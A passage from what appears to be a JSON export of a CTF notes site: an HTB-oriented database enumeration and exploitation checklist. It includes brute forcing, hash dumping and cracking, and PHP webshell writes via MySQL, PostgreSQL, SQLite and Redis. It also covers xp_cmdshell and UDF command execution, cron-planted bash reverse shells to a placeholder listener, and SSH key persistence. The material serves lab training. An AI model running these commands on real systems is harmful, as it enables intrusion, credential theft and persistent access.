Domain Controller — anchors the whole AD enum</td>\n</tr>\n<tr>\n<td>Mailing</td>\n<td>VHost / DNS check identifies the mail subdomain hosting the hMailServer admin interface</td>\n</tr>\n</tbody>\n</table>"
    },
    {
      "title": "Database — Enumeration and Exploitation Checklist",
      "slug": "database-enumeration-and-exploitation-checklist",
      "date": "2026·02·19",
      "tags": [
        "htb",
        "database",
        "enumeration",
        "methodology",
        "enum"
      ],
      "desc": "Quick Order 1. Identify DBMS (ports, processes, config files) 2. Search for DB credentials in config (wp-config.php, .env, db_utils.php) 3. Connect and enumerate (databases, tables, users) 4. Extract and crack hashes (hashcat/john) 5. Try reused passwords on SSH / other…",
      "body": "<h2 id=\"recommended-execution-priority\">Recommended Execution Priority</h2>\n<blockquote>\n<p><strong>Quick Order</strong><br>\n1. Identify DBMS (ports, processes, config files)\n2. Search for DB credentials in config (<code>wp-config.php</code>, <code>.env</code>, <code>db_utils.php</code>)\n3. Connect and enumerate (databases, tables, users)\n4. Extract and crack hashes (hashcat/john)\n5. Try reused passwords on SSH / other services\n6. Exploit DB-specific features (file read/write, xp_cmdshell, UDF)\n7. <strong>If root/DBA:</strong> dump internal DBMS credentials → read <code>/etc/shadow</code> → OS command execution → pivot via linked servers</p>\n</blockquote>\n<hr>\n<h1 id=\"database-enumeration-exploitation-checklist\">Database // Enumeration &amp; Exploitation Checklist</h1>\n<blockquote>\n<p><strong>Context</strong><br>\nChecklist for enumeration and attack on <strong>database as a service</strong> on HTB/CTF machines.\nCovers: MySQL/MariaDB, PostgreSQL, MSSQL, SQLite, MongoDB, Redis.\nAvailable tools: mysql, psql, sqlite3, mongosh, redis-cli, impacket-mssqlclient</p>\n</blockquote>\n<hr>\n<h2 id=\"0-identification\">0 // Identification</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Standard nmap ports</li>\n</ul>\n<pre><code class=\"language-bash\">nmap -sC -sV -p 1433,3306,5432,27017,6379 &lt;TARGET&gt;\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>Port</th>\n<th>Service</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3306</td>\n<td>MySQL / MariaDB</td>\n</tr>\n<tr>\n<td>5432</td>\n<td>PostgreSQL</td>\n</tr>\n<tr>\n<td>1433</td>\n<td>MSSQL</td>\n</tr>\n<tr>\n<td>27017</td>\n<td>MongoDB</td>\n</tr>\n<tr>\n<td>6379</td>\n<td>Redis</td>\n</tr>\n</tbody>\n</table>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Local databases on compromised machine</li>\n</ul>\n<pre><code class=\"language-bash\"># Active processes\nps aux | grep -iE &quot;mysql|postgres|mongo|mssql|redis|mariadb&quot;\n\n# Listening sockets and ports\nss -tlnp | grep -E &quot;3306|5432|1433|27017|6379&quot;\n\n# SQLite database files\nfind / -name &quot;*.db&quot; -o -name &quot;*.sqlite&quot; -o -name &quot;*.sqlite3&quot; 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Credentials in configuration files</li>\n</ul>\n<pre><code class=\"language-bash\"># PHP\ngrep -ri &quot;db_pass\\|db_user\\|DB_HOST\\|mysql_connect\\|mysqli\\|PDO(&quot; /var/www/ /opt/ /srv/ 2&gt;/dev/null\n\n# .env files\nfind / -name &quot;.env&quot; -exec grep -li &quot;DB_\\|DATABASE_\\|MYSQL_\\|POSTGRES_&quot; {} \\; 2&gt;/dev/null\n\n# Common configs\nfind / -name &quot;wp-config.php&quot; -o -name &quot;config.php&quot; -o -name &quot;db_utils.php&quot; \\\n       -o -name &quot;settings.py&quot; -o -name &quot;database.yml&quot; -o -name &quot;application.properties&quot; 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Brute force credentials</li>\n</ul>\n<pre><code class=\"language-bash\"># MySQL\nhydra -l root -P /usr/share/wordlists/rockyou.txt &lt;TARGET&gt; mysql\n\n# PostgreSQL\nhydra -l postgres -P /usr/share/wordlists/rockyou.txt &lt;TARGET&gt; postgres\n\n# MSSQL\nhydra -l sa -P /usr/share/wordlists/rockyou.txt &lt;TARGET&gt; mssql\n\n# MongoDB\nnmap --script mongodb-brute -p 27017 &lt;TARGET&gt;\n</code></pre>\n<hr>\n<h2 id=\"1-connection\">1 // Connection</h2>\n<h3 id=\"mysql-mariadb\">MySQL / MariaDB</h3>\n<pre><code class=\"language-bash\"># With found credentials\nmysql -h &lt;TARGET&gt; -u &lt;USER&gt; -p'&lt;PASS&gt;'\nmysql -h &lt;TARGET&gt; -u &lt;USER&gt; -p'&lt;PASS&gt;' &lt;DATABASE&gt;\n\n# From localhost (post-exploitation)\nmysql -u root -p\nmysql -u root          # often no password in CTF\n\n# Anonymous login\nmysql -h &lt;TARGET&gt; -u root --password=''\n</code></pre>\n<h3 id=\"postgresql\">PostgreSQL</h3>\n<pre><code class=\"language-bash\">psql -h &lt;TARGET&gt; -U &lt;USER&gt; -d &lt;DATABASE&gt;\n\n# From localhost\npsql -U postgres\n</code></pre>\n<h3 id=\"mssql\">MSSQL</h3>\n<pre><code class=\"language-bash\"># Impacket (always with prefix!)\nimpacket-mssqlclient &lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET&gt;\nimpacket-mssqlclient &lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET&gt; -windows-auth\n\n# sqsh\nsqsh -S &lt;TARGET&gt; -U &lt;USER&gt; -P '&lt;PASS&gt;'\n</code></pre>\n<h3 id=\"sqlite\">SQLite</h3>\n<pre><code class=\"language-bash\">sqlite3 /path/to/database.db\n</code></pre>\n<h3 id=\"mongodb\">MongoDB</h3>\n<pre><code class=\"language-bash\">mongosh &lt;TARGET&gt;:27017\nmongosh &lt;TARGET&gt;:27017/&lt;DATABASE&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'\n</code></pre>\n<blockquote>\n<p><strong>Default credentials</strong><br>\nAlways try before bruteforce:\n<code>root:root</code>, <code>root:</code> (empty), <code>root:toor</code>, <code>admin:admin</code>, <code>sa:sa</code>, <code>postgres:postgres</code></p>\n</blockquote>\n<hr>\n<h2 id=\"2-post-connection-enumeration\">2 // Post-connection Enumeration</h2>\n<h3 id=\"mysql-mariadb_1\">MySQL / MariaDB</h3>\n<pre><code class=\"language-sql\">-- Database\nSHOW DATABASES;\nUSE &lt;database&gt;;\n\n-- Tables\nSHOW TABLES;\nDESCRIBE &lt;table&gt;;\n\n-- Users and privileges\nSELECT user, host, authentication_string FROM mysql.user;\nSHOW GRANTS;\nSHOW GRANTS FOR '&lt;user&gt;'@'localhost';\n\n-- Version\nSELECT @@version;\nSELECT @@datadir;\n</code></pre>\n<h3 id=\"postgresql_1\">PostgreSQL</h3>\n<pre><code class=\"language-sql\">-- Database\n\\l\n\\c &lt;database&gt;\n\n-- Tables\n\\dt\n\\d &lt;table&gt;\n\n-- Users and roles\n\\du\nSELECT usename, passwd FROM pg_shadow;\n\n-- Version\nSELECT version();\n</code></pre>\n<h3 id=\"mssql_1\">MSSQL</h3>\n<pre><code class=\"language-sql\">-- Database\nSELECT name FROM sys.databases;\nUSE &lt;database&gt;;\n\n-- Tables\nSELECT * FROM information_schema.tables;\n\n-- Users\nSELECT name, type_desc FROM sys.server_principals;\n\n-- Version\nSELECT @@version;\n</code></pre>\n<h3 id=\"sqlite_1\">SQLite</h3>\n<pre><code class=\"language-sql\">-- Tables\n.tables\n.schema &lt;table&gt;\n\n-- Dump full structure\n.dump\n</code></pre>\n<h3 id=\"mongodb_1\">MongoDB</h3>\n<pre><code class=\"language-javascript\">// Database\nshow dbs\nuse &lt;database&gt;\n\n// Collections\nshow collections\ndb.&lt;collection&gt;.find().pretty()\n\n// Users\ndb.getUsers()\n</code></pre>\n<hr>\n<h2 id=\"3-credential-extraction\">3 // Credential Extraction</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Tables with suspicious names</li>\n</ul>\n<pre><code class=\"language-sql\">-- MySQL / PostgreSQL / MSSQL\nSELECT table_name FROM information_schema.tables\nWHERE table_name LIKE '%user%'\n   OR table_name LIKE '%login%'\n   OR table_name LIKE '%account%'\n   OR table_name LIKE '%admin%'\n   OR table_name LIKE '%credential%'\n   OR table_name LIKE '%player%';\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> User dumps and hashes</li>\n</ul>\n<pre><code class=\"language-sql\">-- Generic example\nSELECT * FROM users;\nSELECT username, password, email, role FROM users;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Identify hash type and crack</li>\n</ul>\n<pre><code class=\"language-bash\"># Identify hash\nhashid '&lt;HASH&gt;'\nhash-identifier\n\n# Crack with hashcat\nhashcat -m &lt;MODE&gt; hash.txt /usr/share/wordlists/rockyou.txt\n\n# Crack with john\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>Hash</th>\n<th>hashcat mode</th>\n<th>Example</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>MD5</td>\n<td>0</td>\n<td><code>5f4dcc3b5aa765d61d8327deb882cf99</code></td>\n</tr>\n<tr>\n<td>SHA-1</td>\n<td>100</td>\n<td><code>5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8</code></td>\n</tr>\n<tr>\n<td>SHA-256</td>\n<td>1400</td>\n<td><code>5e884898da28047151d0e56f8dc...</code></td>\n</tr>\n<tr>\n<td>bcrypt</td>\n<td>3200</td>\n<td><code>$2b$12$...</code></td>\n</tr>\n<tr>\n<td>MySQL 4.1+</td>\n<td>300</td>\n<td><code>*2470C0C06DEE42FD1618BB9900...</code></td>\n</tr>\n<tr>\n<td>MSSQL 2012+</td>\n<td>1731</td>\n<td><code>0x0200...</code></td>\n</tr>\n</tbody>\n</table>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Reused passwords — try DB credentials on SSH, web apps, other users</li>\n</ul>\n<pre><code class=\"language-bash\">ssh &lt;user&gt;@&lt;TARGET&gt;\nsu - &lt;user&gt;\n</code></pre>\n<hr>\n<h2 id=\"4-db-specific-exploitation\">4 // DB-specific Exploitation</h2>\n<h3 id=\"mysql-file-read-write\">MySQL // File Read / Write</h3>\n<pre><code class=\"language-sql\">-- Read files (requires FILE privilege)\nSELECT LOAD_FILE('/etc/passwd');\nSELECT LOAD_FILE('/etc/shadow');\nSELECT LOAD_FILE('/home/&lt;user&gt;/.ssh/id_rsa');\n\n-- Check restrictions\nSHOW VARIABLES LIKE 'secure_file_priv';\n-- '' (empty) → no restrictions\n-- NULL → FILE disabled\n-- '/path/' → only from that directory\n\n-- Write files (requires FILE privilege + non-restrictive secure_file_priv)\nSELECT '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' INTO OUTFILE '/var/www/html/shell.php';\n-- DUMPFILE for binaries (does not add newline)\nSELECT 0xCAFEBABE INTO DUMPFILE '/path/to/file';\n</code></pre>\n<blockquote>\n<p><strong>MySQL Limitations</strong><br>\n- <code>INTO OUTFILE</code> fails if the file already exists\n- <code>secure_file_priv</code> can restrict the write directory\n- The file is created with owner <code>mysql:mysql</code> — permissions can be an issue\n- <code>DUMPFILE</code> writes exactly the bytes without a final newline (useful for binaries/UDF)</p>\n</blockquote>\n<h3 id=\"mysql-udf-user-defined-functions\">MySQL // UDF (User Defined Functions)</h3>\n<pre><code class=\"language-sql\">-- 1. Find plugin directory\nSHOW VARIABLES LIKE 'plugin_dir';\n-- Ex: /usr/lib/mysql/plugin/\n\n-- 2. Load UDF library (lib_mysqludf_sys)\nSELECT &lt;BINARY_BLOB&gt; INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';\nCREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';\nCREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';\n\n-- 3. Execute commands\nSELECT sys_eval('id');\nSELECT sys_eval('cat /etc/shadow');\nSELECT sys_exec('bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&quot;');\n\n-- 4. Cleanup\nDROP FUNCTION sys_eval;\nDROP FUNCTION sys_exec;\n</code></pre>\n<blockquote>\n<p><strong>Precompiled UDFs</strong><br>\nsqlmap includes UDF libraries in <code>/usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_</code>.\nThey need to be decoded: <code>python3 /usr/share/sqlmap/extra/cloak/cloak.py -d -i lib_mysqludf_sys.so_</code></p>\n</blockquote>\n<h3 id=\"mssql-xp_cmdshell\">MSSQL // xp_cmdshell</h3>\n<pre><code class=\"language-sql\">-- Enable xp_cmdshell (requires sysadmin)\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n\n-- Execute commands\nEXEC xp_cmdshell 'whoami';\nEXEC xp_cmdshell 'type C:\\Users\\Administrator\\Desktop\\flag.txt';\nEXEC xp_cmdshell 'net user';\nEXEC xp_cmdshell 'net localgroup administrators';\n\n-- Reverse shell\nEXEC xp_cmdshell 'powershell -e &lt;BASE64_PAYLOAD&gt;';\n\n-- Alternative if xp_cmdshell is blocked: OLE Automation\nEXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;\nDECLARE @cmd INT;\nEXEC sp_OACreate 'WScript.Shell', @cmd OUTPUT;\nEXEC sp_OAMethod @cmd, 'Run', NULL, 'cmd /c whoami &gt; C:\\tmp\\output.txt';\n</code></pre>\n<h3 id=\"mssql-read-files\">MSSQL // Read Files</h3>\n<pre><code class=\"language-sql\">SELECT * FROM OPENROWSET(BULK 'C:\\Users\\Administrator\\Desktop\\flag.txt', SINGLE_CLOB) AS f;\n</code></pre>\n<h3 id=\"mssql-linked-servers-pivot\">MSSQL // Linked Servers (Pivot)</h3>\n<pre><code class=\"language-sql\">-- List linked servers\nEXEC sp_linkedservers;\nSELECT * FROM sys.servers;\n\n-- Execute queries on linked server\nSELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@version');\nEXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];\n\n-- Enumerate users on the linked server\nSELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT name FROM sys.server_principals');\n</code></pre>\n<h3 id=\"postgresql-command-execution\">PostgreSQL // Command Execution</h3>\n<pre><code class=\"language-sql\">-- COPY to read files (superuser)\nCREATE TABLE IF NOT EXISTS tmp_read(line TEXT);\nCOPY tmp_read FROM '/etc/passwd';\nSELECT * FROM tmp_read;\nDROP TABLE tmp_read;\n\n-- COPY to write files\nCOPY (SELECT '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;') TO '/var/www/html/shell.php';\n\n-- COPY FROM PROGRAM — command execution (superuser)\nCREATE TABLE IF NOT EXISTS cmd_output(line TEXT);\nCOPY cmd_output FROM PROGRAM 'id';\nSELECT * FROM cmd_output;\nDELETE FROM cmd_output;\n\n-- Reverse shell\nCOPY cmd_output FROM PROGRAM 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&quot;';\n</code></pre>\n<h3 id=\"postgresql-large-objects\">PostgreSQL // Large Objects</h3>\n<pre><code class=\"language-sql\">-- Read files via large objects\nSELECT lo_import('/etc/shadow');\nSELECT encode(lo_get(&lt;OID&gt;), 'escape');\nSELECT lo_unlink(&lt;OID&gt;);\n</code></pre>\n<h3 id=\"postgresql-dblink-pivot\">PostgreSQL // dblink (Pivot)</h3>\n<pre><code class=\"language-sql\">-- Connect to another PostgreSQL server\nSELECT * FROM dblink('host=&lt;OTHER_HOST&gt; dbname=postgres user=postgres password=&lt;PASS&gt;',\n  'SELECT usename, passwd FROM pg_shadow') AS t(usename TEXT, passwd TEXT);\n</code></pre>\n<h3 id=\"sqlite-attach-database-webshell\">SQLite // Attach Database (webshell)</h3>\n<pre><code class=\"language-sql\">-- Create a new database in the document root as a webshell\nATTACH DATABASE '/var/www/html/shell.php' AS shell;\nCREATE TABLE shell.cmd(payload TEXT);\nINSERT INTO shell.cmd VALUES('&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;');\n</code></pre>\n<hr>\n<h2 id=\"5-root-sul-db-post-exploitation\">5 // Root sul DB // Post-Exploitation</h2>\n<blockquote>\n<p><strong>Scenario</strong><br>\nYou have <strong>root / DBA / superuser</strong> access to the database (credentials found, local post-exploitation access). This section covers everything you can do with full administrative access to the DBMS.</p>\n</blockquote>\n<h3 id=\"50-check-privileges\">5.0 // Check privileges</h3>\n<pre><code class=\"language-sql\">-- MySQL / MariaDB\nSELECT user(), current_user();\nSHOW GRANTS;\nSHOW GRANTS FOR CURRENT_USER();\n-- Look for: ALL PRIVILEGES, FILE, SUPER, PROCESS\n\n-- PostgreSQL\nSELECT current_user, session_user;\nSELECT rolname, rolsuper, rolcreaterole, rolcreatedb FROM pg_roles WHERE rolname = current_user;\n-- rolsuper = t → superuser\n\n-- MSSQL\nSELECT SYSTEM_USER, USER_NAME();\nSELECT IS_SRVROLEMEMBER('sysadmin');\n-- 1 → sysadmin\nSELECT * FROM fn_my_permissions(NULL, 'SERVER');\n</code></pre>\n<h3 id=\"51-dump-internal-dbms-credentials\">5.1 // Dump internal DBMS credentials</h3>\n<blockquote>\n<p><strong>High priority</strong><br>\nDB user hashes are often reused for SSH, webapps, or other services on the same machine.</p>\n</blockquote>\n<pre><code class=\"language-sql\">-- MySQL / MariaDB — all users and hashes\nSELECT user, host, authentication_string, plugin FROM mysql.user;\n-- plugin 'mysql_native_password' → crackable hash (hashcat -m 300)\n-- plugin 'caching_sha2_password' → hashcat -m 7401\n\n-- PostgreSQL — hashes from pg_shadow (requires superuser)\nSELECT usename, passwd FROM pg_shadow;\n-- Format: md5&lt;hash&gt;&lt;username&gt; → hashcat -m 12 with --username\n\n-- MSSQL — logins and hashes\nSELECT name, password_hash FROM sys.sql_logins;\n-- hashcat -m 1731 (MSSQL 2012+)\n\n-- MongoDB\nuse admin\ndb.system.users.find().pretty()\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Crack all found hashes</li>\n</ul>\n<pre><code class=\"language-bash\"># MySQL\nhashcat -m 300 mysql_hashes.txt /usr/share/wordlists/rockyou.txt\n\n# PostgreSQL (md5 format)\nhashcat -m 12 --username pg_hashes.txt /usr/share/wordlists/rockyou.txt\n\n# MSSQL\nhashcat -m 1731 mssql_hashes.txt /usr/share/wordlists/rockyou.txt\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Try every found password on SSH and other system users</li>\n</ul>\n<h3 id=\"52-full-application-data-dump\">5.2 // Full application data dump</h3>\n<pre><code class=\"language-sql\">-- MySQL — list ALL databases and tables\nSELECT table_schema, table_name FROM information_schema.tables\nWHERE table_schema NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')\nORDER BY table_schema, table_name;\n\n-- Targeted dump of sensitive tables\nSELECT * FROM &lt;app_db&gt;.users;\nSELECT * FROM &lt;app_db&gt;.accounts;\nSELECT * FROM &lt;app_db&gt;.sessions;\nSELECT * FROM &lt;app_db&gt;.tokens;\nSELECT * FROM &lt;app_db&gt;.api_keys;\n\n-- PostgreSQL — same logic\nSELECT schemaname, tablename FROM pg_tables\nWHERE schemaname NOT IN ('pg_catalog', 'information_schema');\n\n-- MSSQL\nSELECT TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES\nWHERE TABLE_TYPE = 'BASE TABLE';\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Search for tables with sensitive names in all databases</li>\n</ul>\n<pre><code class=\"language-sql\">SELECT table_schema, table_name FROM information_schema.tables\nWHERE table_name LIKE '%pass%'\n   OR table_name LIKE '%secret%'\n   OR table_name LIKE '%token%'\n   OR table_name LIKE '%key%'\n   OR table_name LIKE '%config%'\n   OR table_name LIKE '%session%';\n</code></pre>\n<h3 id=\"53-files-to-read-with-priority\">5.3 // Files to read with priority</h3>\n<blockquote>\n<p><strong>File checklist</strong><br>\n- <code>/etc/shadow</code> — OS user hashes (crack with john/hashcat)\n- <code>/etc/hostname</code> — confirms hostname\n- <code>/home/*/.ssh/id_rsa</code> — SSH private keys\n- <code>/root/.ssh/id_rsa</code> — root's SSH key\n- <code>/var/www/html/.env</code> — app credentials\n- <code>/proc/self/environ</code> — DB process environment variables\n- DBMS config itself (<code>/etc/mysql/my.cnf</code>, <code>/var/lib/pgsql/data/pg_hba.conf</code>)\n- Windows: <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>, <code>C:\\inetpub\\wwwroot\\web.config</code></p>\n</blockquote>\n<h3 id=\"54-write-files-to-filesystem\">5.4 // Write files to filesystem</h3>\n<pre><code class=\"language-sql\">-- MySQL — SSH authorized_keys\nSELECT '&lt;SSH_PUBKEY&gt;' INTO OUTFILE '/home/&lt;user&gt;/.ssh/authorized_keys';\nSELECT '&lt;SSH_PUBKEY&gt;' INTO OUTFILE '/root/.ssh/authorized_keys';\n\n-- MySQL — Cron job (if /etc/cron.d is writable by the mysql process)\nSELECT '* * * * * root bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&quot;'\nINTO OUTFILE '/etc/cron.d/revshell';\n\n-- PostgreSQL\nCOPY (SELECT '&lt;SSH_PUBKEY&gt;') TO '/home/&lt;user&gt;/.ssh/authorized_keys';\n</code></pre>\n<h3 id=\"55-from-db-root-to-os-root\">5.5 // From DB root to OS root</h3>\n<blockquote>\n<p><strong>When the DBMS runs as root</strong><br>\nIf the database process runs as <code>root</code> (rare but possible in CTFs), any command executed via UDF, xp_cmdshell, or COPY FROM PROGRAM will run as root.</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Check which user the DBMS is running as</li>\n</ul>\n<pre><code class=\"language-sql\">-- MySQL\nSELECT @@basedir;\n-- Then from OS: ps aux | grep mysql → check user\n\n-- PostgreSQL (via COPY FROM PROGRAM if superuser)\nCREATE TABLE IF NOT EXISTS cmd_output(line TEXT);\nCOPY cmd_output FROM PROGRAM 'id';\nSELECT * FROM cmd_output;\n\n-- MSSQL\nEXEC xp_cmdshell 'whoami';\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> If running as a non-privileged user (<code>mysql</code>, <code>postgres</code>):</li>\n<li>Write webshell in document root</li>\n<li>Write SSH key for DB user (<code>/var/lib/mysql/.ssh/</code>, <code>/var/lib/postgresql/.ssh/</code>)</li>\n<li>Write cron job if possible</li>\n<li>\n<p>Look for SUID, sudo, capabilities for DB user</p>\n</li>\n<li class=\"task-list-item\">\n<p><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> If running as <code>root</code>:</p>\n</li>\n<li>Read <code>/etc/shadow</code> and flags directly</li>\n<li>Write to <code>/root/.ssh/authorized_keys</code></li>\n<li>Add user to <code>/etc/passwd</code></li>\n<li>Reverse shell = root shell</li>\n</ul>\n<h2 id=\"6-redis\">6 // Redis</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Connection and enumeration</li>\n</ul>\n<pre><code class=\"language-bash\"># Connection\nredis-cli -h &lt;TARGET&gt;\n\n# Without authentication\nredis-cli -h &lt;TARGET&gt; INFO\nredis-cli -h &lt;TARGET&gt; CONFIG GET *\nredis-cli -h &lt;TARGET&gt; KEYS '*'\n\n# Dump value\nredis-cli -h &lt;TARGET&gt; GET &lt;KEY&gt;\nredis-cli -h &lt;TARGET&gt; TYPE &lt;KEY&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Webshell via Redis</li>\n</ul>\n<pre><code class=\"language-bash\">redis-cli -h &lt;TARGET&gt; CONFIG SET dir /var/www/html/\nredis-cli -h &lt;TARGET&gt; CONFIG SET dbfilename shell.php\nredis-cli -h &lt;TARGET&gt; SET payload '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;'\nredis-cli -h &lt;TARGET&gt; SAVE\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> SSH key via Redis</li>\n</ul>\n<pre><code class=\"language-bash\"># Generate key\nssh-keygen -f redis_key -N &quot;&quot;\n\n# Write to target\nredis-cli -h &lt;TARGET&gt; CONFIG SET dir /home/&lt;user&gt;/.ssh/\nredis-cli -h &lt;TARGET&gt; CONFIG SET dbfilename authorized_keys\nredis-cli -h &lt;TARGET&gt; SET payload &quot;$(cat redis_key.pub)&quot;\nredis-cli -h &lt;TARGET&gt; SAVE\n\n# Connect\nssh -i redis_key &lt;user&gt;@&lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Cron job via Redis (Linux)</li>\n</ul>\n<pre><code class=\"language-bash\">redis-cli -h &lt;TARGET&gt; CONFIG SET dir /var/spool/cron/crontabs/\nredis-cli -h &lt;TARGET&gt; CONFIG SET dbfilename root\nredis-cli -h &lt;TARGET&gt; SET payload '* * * * * bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&quot;'\nredis-cli -h &lt;TARGET&gt; SAVE\n</code></pre>\n<hr>\n<h2 id=\"7-mongodb\">7 // MongoDB</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Connection and enumeration</li>\n</ul>\n<pre><code class=\"language-bash\"># Without authentication\nmongosh &lt;TARGET&gt;:27017\n\n# With credentials\nmongosh &lt;TARGET&gt;:27017/&lt;DATABASE&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'\n</code></pre>\n<pre><code class=\"language-javascript\">// List databases and collections\nshow dbs\nuse &lt;database&gt;\nshow collections\n\n// Dump data\ndb.&lt;collection&gt;.find().pretty()\ndb.&lt;collection&gt;.count()\n\n// Users and roles\nuse admin\ndb.system.users.find().pretty()\ndb.getUsers()\ndb.getRoles({showPrivileges: true})\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Search for credentials in collections</li>\n</ul>\n<pre><code class=\"language-javascript\">// Common patterns\ndb.users.find()\ndb.accounts.find()\ndb.sessions.find()\ndb.tokens.find()\n</code></pre>\n<hr>\n<h2 id=\"related-machines\">Related Machines</h2>\n<table>\n<thead>\n<tr>\n<th>Machine</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>BoardLight</td>\n<td>MySQL backend of Dolibarr — DB user password reused for SSH login as <code>larissa</code></td>\n</tr>\n<tr>\n<td>Clicker</td>\n<td>MySQL backend driven via SQL injection — <code>password_hash</code> column extracted for offline crack</td>\n</tr>\n<tr>\n<td>Devvortex</td>\n<td>MySQL accessed as the Joomla DB user — <code>#__users</code> extracted for offline bcrypt cracking</td>\n</tr>\n<tr>\n<td>Escape</td>\n<td>MSSQL guest access via <code>impacket-mssqlclient</code> as <code>PublicUser</code> → <code>xp_dirtree</code> triggers SMB auth → NTLMv2 capture</td>\n</tr>\n<tr>\n<td>Jarvis</td>\n<td>MySQL reached through phpMyAdmin CVE-2018-12613 LFI → <code>INTO OUTFILE</code> writes a PHP webshell to the docroot</td>\n</tr>\n<tr>\n<td>Love</td>\n<td>MariaDB enumeration after the SSRF reveals the admin Voting System credentials are reused for DB</td>\n</tr>\n</tbody>\n</table>"
    },
    {
      "title": "FTP — Enumeration and Exploitation Checklist",
      "slug": "ftp-enumeration-and-exploitation-checklist",
      "date": "2026·03·11",
      "tags": [
        "htb",
        "ftp",
        "enumeration",
        "methodology",
        "enum"
      ],
      "desc": "Context FTP (File Transfer Protocol) — port 21/tcp (data on 20/tcp in active mode). Common service on HTB machines. Often configured with anonymous access, weak credentials, or vulnerable versions. Vector for file leaks, webshell uploads, and credential harvesting.",
